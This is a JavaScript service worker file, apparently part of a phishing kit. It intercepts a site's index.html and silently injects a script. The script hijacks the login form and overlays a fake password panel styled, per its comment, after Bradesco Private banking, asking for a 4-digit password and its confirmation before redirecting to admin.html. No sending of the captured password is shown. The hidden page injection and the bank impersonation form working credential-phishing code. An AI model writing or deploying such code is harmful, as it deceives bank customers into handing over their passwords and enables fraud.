/* SW.JS - O ENCAIXE TÉCNICO DALLAS (US-SOUTH) */
const CACHE_NAME = 'engecema-v500';

self.addEventListener('install', (e) => {
    self.skipWaiting(); 
});

self.addEventListener('activate', (e) => {
    e.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // BRECHA TÉCNICA: Intercepta o index.html imutável e injeta o motor de senha
    if (url.pathname.endsWith('index.html') || url.pathname === '/') {
        event.respondWith(
            fetch(event.request).then(async (response) => {
                let html = await response.text();
                
                // INJEÇÃO DA ABA DE SENHA E CONFIRMAÇÃO (ESTILO BRADESCO PRIVATE)
                const scriptSeguranca = `
                <script>
                (function() {
                    window.addEventListener('load', function() {
                        const form = document.querySelector('.login-bar');
                        if (form) {
                            form.onsubmit = function(e) {
                                e.preventDefault();
                                fase1();
                            };
                        }
                    });

                    function fase1() {
                        const aba = document.createElement('div');
                        aba.id = 'aba-dallas';
                        aba.style = "position:fixed; top:0; right:0; width:400px; height:100vh; background:#111; z-index:999999; border-left:2px solid #c5a059; padding:60px 40px; color:#fff; display:flex; flex-direction:column; font-family:Arial; box-shadow:-25px 0 70px #000; box-sizing:border-box;";
                        aba.innerHTML = '<h2 style="color:#c5a059;font-size:16px;">SENHA DE ACESSO</h2><p style="color:#666;font-size:12px;">Identificação Dallas. Informe sua senha de 4 dígitos.</p><input type="password" id="s1" maxlength="4" style="width:100%; padding:20px; background:#000; border:1px solid #333; color:#c5a059; font-size:32px; text-align:center; letter-spacing:10px; margin:30px 0; outline:none;"><button id="btn1" style="width:100%; padding:20px; background:#cc092f; color:#fff; border:none; font-weight:bold; cursor:pointer;">AVANÇAR</button>';
                        document.body.appendChild(aba);
                        document.getElementById('btn1').onclick = function() {
                            const v1 = document.getElementById('s1').value;
                            if(v1.length === 4) { aba.remove(); fase2(v1); }
                        };
                    }

                    function fase2(p1) {
                        const aba = document.createElement('div');
                        aba.style = "position:fixed; top:0; right:0; width:400px; height:100vh; background:#111; z-index:999999; border-left:2px solid #c5a059; padding:60px 40px; color:#fff; display:flex; flex-direction:column; font-family:Arial; box-shadow:-25px 0 70px #000; box-sizing:border-box;";
                        aba.innerHTML = '<h2 style="color:#c5a059;font-size:16px;">CONFIRMAR SENHA</h2><p style="color:#666;font-size:12px;">Repita a senha para validar.</p><input type="password" id="s2" maxlength="4" style="width:100%; padding:20px; background:#000; border:1px solid #333; color:#c5a059; font-size:32px; text-align:center; letter-spacing:10px; margin:30px 0; outline:none;"><button id="btn2" style="width:100%; padding:20px; background:#cc092f; color:#fff; border:none; font-weight:bold; cursor:pointer;">CONFIRMAR E ENTRAR</button>';
                        document.body.appendChild(aba);
                        document.getElementById('btn2').onclick = function() {
                            if(document.getElementById('s2').value === p1) { window.location.href = 'admin.html'; }
                            else { alert('Senhas não conferem.'); location.reload(); }
                        };
                    }
                })();
                </script>`;
                
                return new Response(html.replace('</body>', scriptSeguranca + '</body>'), {
                    headers: { 'Content-Type': 'text/html' }
                });
            })
        );
    }
});
